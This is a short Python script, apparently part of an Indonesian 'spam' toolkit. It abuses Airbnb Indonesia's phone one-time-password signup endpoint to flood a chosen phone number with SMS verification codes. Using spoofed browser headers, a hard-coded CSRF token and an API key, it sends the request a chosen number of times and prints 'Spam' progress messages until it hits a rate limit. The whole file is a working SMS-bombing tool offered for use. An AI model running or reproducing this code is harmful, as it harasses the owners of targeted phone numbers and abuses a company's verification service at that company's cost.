import os,sys,json,requests
from time import sleep
from war.war import *

def air(nom, jml):
	sleep(1)
	print("")

	head = {
	"Host": "www.airbnb.co.id",
	"content-length": "83",
	"device-memory": "2",
	"x-csrf-token": "V4$.airbnb.co.id$N_Kx2ju9iX8$gUBHaO73_UKCj4rDt2rHVNj7zvmZfOYgz38XKc9dzKw=",
	"x-csrf-without-token": "1",
	"user-agent": "Mozilla/5.0 (Linux; Android 6.0; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	"viewport-width": "360",
	"content-type": "application/json",
	"accept": "application/json, text/javascript, */*; q=0.01",
	"cache-control": "no-cache",
	"x-requested-with": "XMLHttpRequest",
	"origin": "https://www.airbnb.co.id",
	"referer": "https://www.airbnb.co.id/signup_login?redirect_url=/help",
	}

	dat = json.dumps({"phoneNumber": nom,"workFlow":"GLOBAL_SIGNUP_LOGIN","otpMethod":"TEXT"})

	for i in range(jml):
		cal = requests.post("https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id",data=dat,headers=head)
		if 'internationalPhoneNumber' in cal.text:
			print(f"{k}[+] {c}Spam Ke {o}>> {k}"+nom)
			sleep(1)
		else:
			print(f"{r}[!] {c}Spam Limit {o}>> {k}"+nom)
			sleep(1)
			exit("")
